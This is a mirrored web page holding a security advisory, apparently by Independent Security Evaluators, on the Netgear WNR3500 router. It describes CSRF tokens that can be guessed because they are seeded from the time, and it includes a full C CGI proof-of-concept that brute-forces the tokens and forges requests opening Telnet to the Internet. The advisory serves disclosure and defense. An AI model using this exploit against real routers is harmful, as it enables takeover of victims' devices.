@@ -1,0 +1,833 @@
+<!doctype html>
+<html lang="en">
+
+
+<!-- Mirrored from www.ise.io/research/studies-and-papers/netgear_wnr3500/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 31 Aug 2023 07:29:24 GMT -->
+<head>
+    <title>Netgear WNR3500 - Independent Security Evaluators - Independent Security Evaluators</title>
+    <meta charset="utf-8">
+	<meta name="description" content="The Netgear WNR3500 router is susceptible to a previously disclosed vulnerability in its Telnet service that runs by default on port 23." />
+	<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+	<link rel="canonical" href="index.html" />
+	<meta property="og:locale" content="en_US" />
+	<meta property="og:type" content="article" />
+	<meta property="og:title" content="Netgear WNR3500 - Independent Security Evaluators" />
+	<meta property="og:description" content="The Netgear WNR3500 router is susceptible to a previously disclosed vulnerability in its Telnet service that runs by default on port 23." />
+	<meta property="og:url" content="index.html" />
+	<meta property="og:site_name" content="Independent Security Evaluators" />
+	<meta property="og:image" content="../../../assets/img/logo_white_square.png" />
+	<meta name="twitter:card" content="summary_large_image" />
+
+    <!-- Required meta tags -->
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="ahrefs-site-verification" content="79c692fee3854586781d3f86d234931ba3f5a12705c23db76407351e42aa6757">
+
+    <!-- fonts preload -->
+    <link rel="preload" href="../../../assets/fonts/HK%20Grotesk%20Pro/HKGroteskPro-Regular.woff2" as="font" type="font/woff2" crossorigin/>
+    <link rel="preload" href="../../../assets/fonts/HK%20Grotesk%20Pro/HKGroteskPro-Medium.woff2" as="font" type="font/woff2" crossorigin/>
+
+
+    <!-- Libs CSS -->
+    <link rel="stylesheet" href="../../../assets/fonts/Feather/feather.css">
+    <link rel="stylesheet" href="../../../assets/libs/%40fancyapps/fancybox/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="../../../assets/libs/aos/dist/aos.css">
+
+    <!-- <link rel="stylesheet" type="text/css" href="../../../assets/font-awesome/css/font-awesome.min.css"> -->
+    <link rel="stylesheet" href="../../../../unpkg.com/flickity%402.3.0/dist/flickity.min.css">
+    <script src="../../../../unpkg.com/flickity%402.3.0/dist/flickity.pkgd.min.js"></script>
+    <!-- <link rel="stylesheet" href="../../../assets/libs/choices.js/public/assets/styles/choices.min.css">
+    <link rel="stylesheet" href="../../../assets/libs/flickity-fade/flickity-fade.css">
+    <link rel="stylesheet" href="../../../assets/libs/flickity/dist/flickity.min.css">
+    <link rel="stylesheet" href="../../../assets/libs/highlightjs/styles/vs2015.css">
+    <link rel="stylesheet" href="../../../assets/libs/jarallax/dist/jarallax.css">
+    <link rel="stylesheet" href="../../../assets/libs/quill/dist/quill.core.css" /> -->
+
+
+    <!-- Font awesome animations -->
+    <script src="../../../../kit.fontawesome.com/275cf458c9.js" crossorigin="anonymous"></script> 
+    <link rel="stylesheet" href="../../../../cdnjs.cloudflare.com/ajax/libs/font-awesome-animation/0.3.0/font-awesome-animation.min.css" integrity="sha512-Po8rrCwchD03Wo+2ibHFielZ8luDAVoCyE9i6iFMPyn9+V1tIhGk5wl8iKC9/JfDah5Oe9nV8QzE8HHgjgzp3g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+    <!-- Theme CSS -->
+    <link rel="stylesheet" href="../../../assets/css/theme.min.css">
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-HZ2ZZMHS4S"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-HZ2ZZMHS4S');
+    </script>
+
+    <!-- Google Tag Manager -->
+    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+      new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+      j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+      '../../../../www.googletagmanager.com/gtm5445.html?id='+i+dl;f.parentNode.insertBefore(j,f);
+      })(window,document,'script','dataLayer','GTM-TW7J76M');</script>
+    <!-- End Google Tag Manager -->
+
+    <!-- Google Material Icons -->
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
+</head>
+
+<body>
+    
+    <!-- NAVBAR
+    ================================================== -->
+    <nav class="navbar fixed-top navbar-expand-lg navbar-light bg-white">
+      <div class="container">
+
+        <!-- Brand -->
+        <a class="navbar-brand" href="../../../index.html">
+          <img src="../../../assets/img/brand.svg" class="navbar-brand-img" alt="...">
+        </a>
+
+        <!-- Buttons-->
+        <div>
+          <!-- Start Page Book a Demo Button -->         <!-- Only shows on screen sizes between extra small to medium -->
+          <!--
+          <a class="btn btn-primary btn-sm lift btn-pd-sm d-xs-block d-lg-none" id="navbar-demo-btn" style="display: none;" rel="noopener">
+          Book a Demo</a>-->
+          <!-- Toggler -->
+          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse"
+            aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+          </button>
+        </div>
+
+        <!-- Collapse -->
+        <div class="collapse navbar-collapse" id="navbarCollapse">
+
+          <!-- Toggler -->
+          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse"
+            aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
+            <i class="fe fe-x"></i>
+          </button>
+
+          <!-- Navigation -->
+          <ul class="navbar-nav ml-auto">
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" id="navbarAbout" data-hover="dropdown" href="../../../about/values/index.html" aria-haspopup="true"
+                aria-expanded="false">
+                About
+              </a>
+              <div class="dropdown-menu dropdown-menu" aria-labelledby="navbarAbout">
+                <div class="row no-gutters">
+                  <div class="col-12 col-lg-8">
+
+                    <!-- Heading -->
+                    <h6 class="dropdown-header">
+                      About ISE
+                    </h6>
+
+                    <!-- List -->
+                    <a class="dropdown-item" href="../../../about/values/index.html" title="Integrity, Quality, Dedication, Education">
+                      Company Values
+                    </a>                                
+
+                    <a class="dropdown-item" href="../../../about/methodology/index.html" title="Learn how we deliver reports">
+                      Methodology
+                    </a>      
+
+                    <a class="dropdown-item" href="../../../about/leadership/index.html" title="Independent Security Evaluators">
+                      Leadership
+                    </a>      
+
+                    <a class="dropdown-item" href="../../../news/index.html" title="Stay up to date">
+                      News
+                    </a>      
+
+                    <a class="dropdown-item" href="../../../careers/index.html" title="Join our team">
+                      Careers
+                    </a>      
+
+                  </div>
+                </div>
+              </div>
+            </li>
+
+
+
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" id="navbarServices" data-hover="dropdown" href="../../../services/vulnerability-assessments/index.html" aria-haspopup="true"
+                aria-expanded="false">
+                Services
+              </a>
+              <div class="dropdown-menu dropdown-menu-lg" aria-labelledby="navbarServices">
+                <div class="row no-gutters">
+                  <div class="col-12 col-lg-6">
+
+                    <!-- Heading -->
+                    <h6 class="dropdown-header">
+                      Assessments
+                    </h6>
+
+                    <!-- List -->
+                    <a class="dropdown-item" href="../../../services/vulnerability-assessments/index.html">
+                      Vulnerability Assessments
+                    </a>
+                    <a class="dropdown-item" href="../../../services/application-security-assessment/index.html">
+                      Application Security Assessments
+                    </a>
+                    <a class="dropdown-item" href="../../../services/cloud-security-assessment/index.html">
+                      Cloud Security Assessments
+                    </a>
+                    <a class="dropdown-item" href="../../../services/penetration-testing/index.html">
+                      Penetration Testing
+                    </a>
+                    <a class="dropdown-item" href="../../../services/network-penetration-testing/index.html">
+                      Network Penetration Testing
+                    </a>
+                    <a class="dropdown-item mb-5" href="../../../services/managed-vulnerability-scanning/index.html">
+                      Vulnerability Scanning
+                    </a>
+                
+                    <!-- Heading -->
+                    <h6 class="dropdown-header">
+                      Hacking Events
+                    </h6>
+
+                    <!-- List -->
+                    <a class="dropdown-item mb-5" href="https://www.iotvillage.org/" target="_blank" rel="noopener">
+                      IoT Village <span class="fe fe-external-link"></span>
+                    </a>
+
+                  </div>
+                  <div class="col-12 col-lg-6">
+
+                    <!-- Heading -->
+                    <h6 class="dropdown-header">
+                      Consulting
+                    </h6>
+
+                    <!-- List -->
+                    <a class="dropdown-item" href="../../../services/security-consulting-services/index.html">
+                      Security Consulting
+                    </a>
+                    <a class="dropdown-item" href="../../../services/independent-verification-and-validation/index.html">
+                      Independent Verification & Validation
+                    </a>
+                    <a class="dropdown-item" href="../../../services/secure-design-analysis/index.html">
+                      Secure Design Analysis
+                    </a>
+                    <a class="dropdown-item mb-5" href="../../../services/it-consulting-services/index.html">
+                      IT Consulting
+                    </a>
+                
+                    <!-- Heading -->
+                    <h6 class="dropdown-header">
+                      Training
+                    </h6>
+
+                    <!-- List -->
+                    <a class="dropdown-item" href="../../../services/training/index.html">
+                      Security Training
+                    </a>
+
+                    <a class="dropdown-item mb-5" href="https://offers.ise.io/ise-application-security-training-workshop" rel="noopener noreferrer" target="_blank">
+                      Hackalong <span class="fe fe-external-link"></span>
+                    </a>
+
+                  </div>
+                </div>
+              </div>
+            </li>
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" id="navbarResearch" data-hover="dropdown" href="../../index.html" aria-haspopup="true"
+                aria-expanded="false">
+                Research
+              </a>
+              <div class="dropdown-menu dropdown-menu" aria-labelledby="navbarResearch">
+
+                    <!-- Heading -->
+                    <h6 class="dropdown-header">
+                      Research
+                    </h6>
+
+                    <!-- List -->
+                    <a class="dropdown-item" href="../../index.html" title="Papers & Studies">
+                      Papers & Studies
+                    </a>                                
+
+                    <a class="dropdown-item" href="../../../talks/index.html" title="Talks">
+                      Talks
+                    </a>      
+
+                    <a class="dropdown-item" href="../../../blog/index.html" title="Hackers Blog">
+                      Hackers Blog
+                    </a>      
+
+                    <a class="dropdown-item" href="https://blog.ise.io/blog" title="Industry Blog" rel="noopener noreferrer" target="_blank">
+                      Industry Blog <span class="fe fe-external-link"></span>
+                    </a>      
+
+                    <a class="dropdown-item" href="../../../start/blog/index.html" title="Join our team">
+                      VRM/TPRM Articles
+                    </a>  
+
+                    <a class="dropdown-item" href="../../podcast/index.html" title="Join our team">
+                      Podcast
+                    </a>   
+       
+                </div>
+            </li>
+
+            <!-- Start-->
+            <!-- <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" id="navbarStart" data-hover="dropdown" href="../../../start/" aria-haspopup="true"
+                aria-expanded="false">
+                START VRM
+              </a>
+              <div class="dropdown-menu dropdown-menu-md" aria-labelledby="navbarStart">
+                <div class="list-group list-group-flush p-4">
+
+                  <a class="list-group-item" href="../../../start/blog/">
+                    <div class="ml-4">
+                      <h6 class="font-weight-bold text-uppercase text-primary mb-0">
+                        Blog
+                      </h6>
+                    </div>
+
+                  </a>
+
+                </div>
+              </div>
+            </li> -->
+        
+            <li class="nav-item dropdown">
+              <a class="nav-link" id="navbarStart" href="../../../start/index.html">
+                START - Vendor Risk Management
+              </a>
+            </li>
+
+
+          </ul>
+      
+          <a class="navbar-btn btn btn-sm btn-primary lift ml-auto"
+            href="https://offers.ise.io/ask-an-expert" target="_blank" rel="noopener">
+            Ask an Expert
+          </a>
+
+        </div>
+
+      </div>
+    </nav>
+
+    <!-- CONTENT
+    ================================================== -->
+    
+<!-- WELCOME
+================================================== -->
+<section class="pt-12 pt-md-12 pb-8 border-bottom">
+    <div class="container">
+        <div class="row">
+            <div class="col-12">
+
+				<!-- Headin -->
+				<h1>
+					Taking over the Netgear WNR3500
+				</h1>
+<div>
+<p><a href="../../../casestudies/exploiting-soho-routers/index.html#summary">[return to summary]</a></p>
+<ul>
+<li><font style="color:red;font-weight:bold;">The WNR3500 can be trivially taken over by any adversary on the LAN or WLAN.<br />
+</font></li>
+<li><font style="color:red;font-weight:bold;">The WNR3500 can be taken over by a remote adversary through CSRF attack.</font></li>
+</ul>
+<h2>Description</h2>
+<p>The Netgear WNR3500 router is susceptible to a previously disclosed vulnerability in its Telnet service that runs by default on port 23.</p>
+<p>ISE discovered that a remote adversary can leverage a CSRF against a WNR3500 administrator to gain control of the router.  The WNR3500 uses HTML form tokens to protect against CSRF attacks.  However, the form tokens are based solely on router's current date and time.  Since the router automatically synchronizes its date and time with Netgear NTP servers, it is trivial for an adversary to guess the CSRF tokens generated on these routers.  ISE created a proof of concept that when executed by an unsuspecting device administrator, attempts to use every HTML form token that could have been created in the previous 20 minutes to enable remote management and remote Telnet access to the router.</p>
+<h2>Local Attack Requirements</h2>
+<ul>
+<li>An attacker must have access to a machine on the local network, either by physically connecting, or by compromising a machine on the local network through other means (e.g., via malware).</li>
+</ul>
+<h2>Remote Attack Requirements</h2>
+<ul>
+<li>The victim must have an active management session with the WNR3500.</li>
+<li>The victim must be fooled in to performing an action (e.g., by clicking an attacker provided link), browse to a malicious or compromised site, or be the victim of a man-in-the-middle attack.</li>
+<li>The router must have, or have had NTP access to its predefined servers (though, even without this, guessing is still possible).</li>
+</ul>
+<h2>Details</h2>
+<p>The Netgear WNR3500's anti-CSRF token generation is based on the C library calls <code>srand(time(NULL))</code> and <code>rand()</code>.  The WNR3500 automatically synchronizes its time using NTP after it establishes an Internet connection.  By synchronizing with Netgear's NTP servers, an attacker can obtain the same date and time as on the router.</p>
+<p>ISE's proof of concept attempts to use the 1200 possible anti-CSRF tokens that would have been generated in the last 20 minutes to enable remote management and -- because the router's password may differ from the default -- open the router's Telnet interface to the Internet.</p>
+<p>The telnet interface has no authentication other than using a "telnetenable" program that is widely available on the Internet.  An attacker must brute-force the device's MAC address to craft the correct "telnetenable" packet, but only three of six bytes of the address are unknown.</p>
+<ul>
+<li>Vulnerable Firmware is V1.2.2.44_35.0.53NA</li>
+<li>Other versions of the firmware were not tested.</li>
+</ul>
+<h2>Impact</h2>
+<p>A successful attack exploiting this vulnerability can give a remote adversary full control over the victim router.</p>
+<h2>Recommendations to the vendor</h2>
+<ul>
+<li>The implementation of anti-CSRF tokens in the WNR3500 is insecure, because an attacker can reasonably guess and reproduce the token generation process.  Cross-Site request forgery can be prevented by including an unpredictable token in each HTTP request submitted to the web server. At a minimum, these tokens should be unique to each user, but it is recommended that each HTML form delivered contain a unique token.</li>
+<li>In addition to HTML form tokens, HTTP referer checking should be enabled.</li>
+<li>Additional information for vendors regarding immediate and long term fixes for these issues can be found on our summary page <a href="../../../casestudies/exploiting-soho-routers/index.html#recommendationsVendors">here</a>. </li>
+</ul>
+<h2>Recommendations to device administrators</h2>
+<ul>
+<li>(4/13/2013) There is not currently an available firmware upgrade that will remedy this vulnerability. </li>
+<li>Take additional preventative measures and precautions by following the steps outlined on our summary page <a href="../../../casestudies/exploiting-soho-routers/index.html#recommendationsAdmin">here</a>.</li>
+</ul>
+<h2>Proof of Concept</h2>
+<p>This attack was complicated by the fact that CSRF tokens are used, an administrator password is required to change or reset the administrator credentials, and that the router rejects the addition of port forwarding rules to itself.  All of these hurdles were overcome in our proof of concept attack.</p>
+<p><font style="font-weight:bold;">Beating CSRF tokens.</font>  The WNR3500 uses anti-forgery tokens that are based on the current time.  This was discovered by debugging the router-side code that generates these tokens.  Since they are based on the current time, they can be easily guessed by attempting all tokens that could have been generated in the previous 20 minutes.  </p>
+<p><font style="font-weight:bold;">Bypassing the credential requirements.</font>  Enabling and accessing the WNR3500's web interface is useless without administrator crendentials, and these can not be obtained or reset through the same CSRF attack.  However, as there is a local authentication bypass vulnerability described here, we were able to leverage this issue to gain access instead.  Our CSRF attack just had to enable some port forwarding rules to grant us remote access to the Telnet administration interface.</p>
+<p>For launching our proof of concept, we assume that a Netgear WNR3500 device administrator with an active management session established with the router has browsed to a malicious web page.  Once there, sequential form submissions take place, automatically, to the administrator's router, from the administrator's browser.  Since the administrator has a current session established with the Netgear router, the form submissions are processed.</p>
+<p>The malicious CGI program (Figure 1) provides an initial attack page, and three additional pages for each of the needed requests (enable remote management, enable Telnet port forwarding, and change the router's IP address to match the destination of the port forwarding).</p>
+<p>The initial attack page contains 1200 anti-CSRF tokens (i.e., those that could have been generated in the past 20 minutes) and JavaScript code to make the three forged requests for each one of them.  The first request enables remote management on the router, the second forwards WAN port 23 requests to temporary IP address 192.168.1.254 on port 23, and the third request changes the router's LAN IP address to 192.168.1.254.</p>
+<p>Once the router resets, the Telnet service is open to the Internet, and an attacker could use the Netgear "telnetenable" tool to access Telnet.  This tool requires knowledge of the router's MAC address, which contains six bytes, three of which are unique.  It is unlikely that these three bytes are randomly chosen (making for a reasonably easy guessing scenario), but even if they were, an attacker could brute force guess the three bytes in 46 hours at 100 telnetenable requests per second.</p>
+<p>After obtaining root shell access through Telnet, an attacker has full control of the router.</p>
+<table class="pocHtml" width="500px">
+<tbody>
+<tr>
+<td>
+<pre><code>
+/*
+ * Netgear WNR3500 CSRF
+ * Firmware: V1.2.2.44_35.0.53NA
+ * Discovered and Exploited By: 
+ *  Jacob Thompson of Independent Security Evaluators
+ * /
+ */
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;time.h&gt;
+
+/*
+ * CGI script to implement CSRF attack.
+ */
+int main (void)
+{
+   const char *qs = getenv ("QUERY_STRING");
+
+   /* initial request */
+   if (!qs || !*qs)
+   {
+      unsigned int seed = time (NULL);
+      unsigned int i;
+
+      puts (
+	 "Content-Type: text/html; charset=iso-8859-1\n\n"
+	 "&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01//EN\"&gt;\n"
+	 "&lt;html&gt;\n"
+	 "&lt;head&gt;\n"
+	 "&lt;title&gt;Netgear CSRF&lt;/title&gt;\n"
+	 "&lt;/head&gt;\n"
+	 "&lt;body&gt;\n"
+	 "&lt;iframe id=\"ifr1\" src=\"\"&gt;&lt;/iframe&gt;\n"
+	 "&lt;iframe id=\"ifr2\" src=\"\"&gt;&lt;/iframe&gt;\n"
+	 "&lt;iframe id=\"ifr3\" src=\"\"&gt;&lt;/iframe&gt;\n"
+	 "&lt;form name=\"form\"&gt;\n"
+	 " ID: &lt;input type=\"text\" name=\"_id\" value=\"\"&gt;\n"
+	 " # &lt;input type=\"text\" name=\"_i\" value=\"\"&gt; of 1200\n"
+	 "&lt;/form&gt;"
+	 "&lt;script type=\"application/javascript\"&gt;\n"
+	 " var i = 0;\n"
+	 " var ifr1 = document.getElementById(\"ifr1\");\n"
+	 " var ifr2 = document.getElementById(\"ifr2\");\n"
+	 " var ifr3 = document.getElementById(\"ifr3\");\n"
+	 " var ids = [");
+
+      /* generate 1200 (20 minutes) worth of tokens */
+      for (i = 0; i &lt; 1200; ++i)
+      {
+	 srand (seed - i);
+	 printf ("  %d,\n", rand ());
+      }
+      puts (
+	 " ];\n"
+	 " function nextId ()\n"
+	 " {\n"
+	 "  if (i &lt; 1200)\n"
+	 "  {\n"
+	 "   document.form._id.value = ids[i];\n"
+	 "   document.form._i.value = i;\n"
+	 "   ifr1.src = \"netgear?A\" + ids[i];\n"
+	 "   ifr2.src = \"netgear?B\" + ids[i];\n"
+	 "   ifr3.src = \"netgear?C\" + ids[i];\n"
+	 "   ++i;\n"
+	 "  }\n"
+	 " }\n"
+	 " window.setInterval (nextId, 200)\n"
+	 "&lt;/script&gt;\n"
+	 "&lt;/body&gt;\n"
+	 "&lt;/html&gt;");
+   }
+   /* first request - enable remote management */
+   else if (*qs == 'A')
+   {
+      unsigned int id = atoi (qs + 1);
+      printf (
+	 "Content-Type: text/html; charset=iso-8859-1\n\n"
+	 "&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01//EN\"&gt;\n"
+	 "&lt;html&gt;\n"
+	 "&lt;head&gt;\n"
+	 "&lt;title&gt;&lt;/title&gt;\n"
+	 "&lt;/head&gt;\n"
+	 "&lt;body&gt;\n"
+	 "&lt;form name=\"csrf\" method=\"post\""
+	 " action=\"http://192.168.1.1/fwRemote.cgi?id=%d\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"rm_access\" value=\"all\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"remote_mg_enable\""
+	 " value=\"remote_mg\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"http_wanipaddr\""
+	 " value=\"0.0.0.0\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"http_rmstartip\""
+	 " value=\"0.0.0.0\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"http_rmport\""
+	 " value=\"8080\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"http_rmendip\""
+	 " value=\"255.255.255.255\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"http_rmenable\" value=\"1\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"Apply\" value=\"apply\"&gt;\n"
+	 "&lt;/form&gt;\n"
+	 "&lt;script type=\"application/javascript\"&gt;\n"
+	 " document.csrf.submit ();\n"
+	 "&lt;/script&gt;\n"
+	 "&lt;/body&gt;\n"
+	 "&lt;/html&gt;\n", id);
+   }
+   /* second request - forward telnet to 192.168.1.254 */
+   else if (*qs == 'B')
+   {
+      unsigned int id = atoi (qs + 1);
+      printf (
+	 "Content-Type: text/html; charset=iso-8859-1\n\n"
+	 "&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01//EN\"&gt;\n"
+	 "&lt;html&gt;\n"
+	 "&lt;head&gt;\n"
+	 "&lt;title&gt;&lt;/title&gt;\n"
+	 "&lt;/head&gt;\n"
+	 "&lt;body&gt;\n"
+	 "&lt;form name=\"csrf\" method=\"post\""
+	 " action=\"http://192.168.1.1/pforward.cgi?id=%d\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"svs_gm\" value=\"Telnet\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"svAdd\" value=\"Add\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"SV_IP4\" value=\"254\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"SV_IP3\" value=\"1\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"SV_IP2\" value=\"168\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"SV_IP1\" value=\"192\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"serv_type\" value=\"pf\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"selectService\" value=\"Telnet\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"selectEntry\" value=\"\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"lanIP\" value=\"192.168.1.1\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"inputIP\" value=\"192.168.1.254\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"fwpf_enable\" value=\"\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"entryData\" value=\"#0\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"action\" value=\"add\"&gt;\n"
+	 "&lt;/form&gt;\n"
+	 "&lt;script type=\"application/javascript\"&gt;\n"
+	 " document.csrf.submit ();\n"
+	 "&lt;/script&gt;\n"
+	 "&lt;/body&gt;\n"
+	 "&lt;/html&gt;\n", id);
+   }
+   /* third request - change router IP to 192.168.1.254 */
+   else if (*qs == 'C')
+   {
+      unsigned int id = atoi (qs + 1);
+      printf (
+	 "Content-Type: text/html; charset=iso-8859-1\n\n"
+	 "&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01//EN\"&gt;\n"
+	 "&lt;html&gt;\n"
+	 "&lt;head&gt;\n"
+	 "&lt;title&gt;&lt;/title&gt;\n"
+	 "&lt;/head&gt;\n"
+	 "&lt;body&gt;\n"
+	 "&lt;form name=\"csrf\" method=\"post\" "
+	 "action=\"http://192.168.1.1/lan.cgi?id=%d\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"action\" value=\"Apply\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"device_name\" value=\"WNR3500L\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"dhcp_end\" value=\"192.168.1.254\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"dhcp_end_old\" value=\"192.168.1.254\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"dhcp_server\" value=\"dhcp_server\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"dhcp_start\" value=\"192.168.1.2\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"dhcp_start_old\" value=\"192.168.1.2\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"l2tp_serv_ipaddr\" value=\"\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"l2tp_wan_ipaddr\" value=\"...\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"lan_ipaddr\" value=\"192.168.1.254\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"lan_netmask\" value=\"255.255.255.0\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"lan_proto\" value=\"dhcp\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"pppoe_wan_ipaddr\" value=\"...\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"pptp_serv_ipaddr\" value=\"...\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"pptp_wan_ipaddr\" value=\"...\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"repeater\" value=\"0\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"repeater_an\" value=\"\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"rip_direction\" value=\"1\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"rip_enable\" value=\"0\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"rip_multicast\" value=\"1\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"rip_version\" value=\"2\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"select\" value=\"-1\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"sysLANIPAddr1\" value=\"192\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"sysLANIPAddr2\" value=\"168\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"sysLANIPAddr3\" value=\"1\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"sysLANIPAddr4\" value=\"254\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"sysLANSubnetMask1\" value=\"255\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"sysLANSubnetMask2\" value=\"255\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"sysLANSubnetMask3\" value=\"255\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"sysLANSubnetMask4\" value=\"0\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"sysPoolFinishAddr4\" value=\"254\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"sysPoolStartingAddr4\" value=\"2\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"sysRIPVersion\" value=\"Disabled\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"wan_ipaddr\" value=\"....\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"wan_netmask\" value=\"255.255.255.0\"&gt;\n"
+	 " &lt;input type=\"hidden\" name=\"wan_proto\" value=\"dhcp\"&gt;\n"
+
+	 "&lt;/form&gt;\n"
+	 "&lt;script type=\"application/javascript\"&gt;\n"
+	 " window.setTimeout(\"document.csrf.submit();\", 100);\n"
+	 "&lt;/script&gt;\n"
+	 "&lt;/body&gt;\n"
+	 "&lt;/html&gt;\n", id);
+   }
+
+   return 0;
+}
+</code></pre>
+</td>
+</tr>
+</tbody>
+</table>
+<p><center><font style="font-weight:bold;">Figure 1. CGI script that returns up to four different pages:  the initial attack page, and the three additional pages that submit the actual forged requests.</font></center></p>
+<h2>References</h2>
+<ul>
+<li> <a href="http://code.google.com/p/netgear-telnetenable/">Netgear-telnetenable on Google Code</a> </li>
+</ul>
+<h2>Credit</h2>
+<ul>
+<li>Discovered By: Jacob Thompson – Security Analyst @ Independent Security Evaluators</li>
+<li>Exploited By: Jacob Thompson – Security Analyst @ Independent Security Evaluators</li>
+</ul>
+<h2>Contact Information</h2>
+<ul>
+<li>For more information on this particular Belkin hack, you can contact us at routers@www.ise.io</li>
+<li>Alternatively, for more general information on ISE, you can reach us using contact@www.ise.io</li>
+</ul>
+</div>
+
+</div>
+</div>
+</div>
+</section>
+
+
+
+    <!-- SHAPE
+    ================================================== -->
+    <div class="position-relative">
+    <div class="shape shape-bottom shape-fluid-x svg-shim text-gray-200">
+        <svg viewBox="0 0 2880 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M0 48h2880V0h-720C1442.5 52 720 0 720 0H0v48z" fill="currentColor"/></svg>
+    </div>
+    </div>
+
+    <!-- FOOTER
+    ================================================== -->
+    <footer class="py-8 py-md-11 bg-gray-200">
+      <div class="container">
+        <div class="row">
+          <div class="col-12 col-md-2">
+
+            <!-- Brand -->
+            <img src="../../../assets/img/brand-text.svg" alt="..." class="footer-brand img-fluid mb-2">
+
+
+            <!-- Social -->
+            <ul class="list-unstyled list-inline list-social mb-6 mb-md-0">
+              <li class="list-inline-item list-social-item mr-3">
+                <a href="https://www.linkedin.com/company/independent-security-evaluators" class="text-decoration-none" rel="noopener">
+                  <img src="../../../assets/img/icons/social/linkedin.svg" class="list-social-icon" alt="...">
+                </a>
+              </li>
+              <li class="list-inline-item list-social-item mr-3">
+                <a href="https://facebook.com/ISE.infosec" class="text-decoration-none" rel="noopener">
+                  <img src="../../../assets/img/icons/social/facebook.svg" class="list-social-icon" alt="...">
+                </a>
+              </li>
+              <li class="list-inline-item list-social-item mr-3">
